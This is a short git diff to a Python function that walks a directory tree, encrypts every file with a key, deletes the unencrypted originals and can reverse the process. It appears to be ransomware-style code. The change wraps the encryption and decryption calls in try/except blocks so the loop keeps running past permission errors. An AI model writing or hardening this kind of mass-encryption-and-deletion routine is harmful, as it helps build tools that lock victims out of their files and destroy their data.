@@ -99,14 +99,21 @@ def manage(function, rootDirectionary, key):#0 encrypt | 1 decrypt
                 continue    
             os.rename(newFilename, filename)
             if function == 0:    
-                    encrypt_file(key, filename, None, 64*1024)
+                    try:
+                        encrypt_file(key, filename, None, 64*1024)
+                    except:
+                        print("Permission denied")    
                     try: 
                         if not ".enc" in filename:
                             shutil.rmtree(filename)
                     except OSError:
                             print("cant delete :(")
             elif function == 1:
-                decrypt_file(key, filename, None, 64*1024)
+                try:
+                    decrypt_file(key, filename, None, 64*1024)
+                except:
+                    print("Permission denied")    
+                
                 try: 
                     if ".enc" in filename:
                         shutil.rmtree(filename)
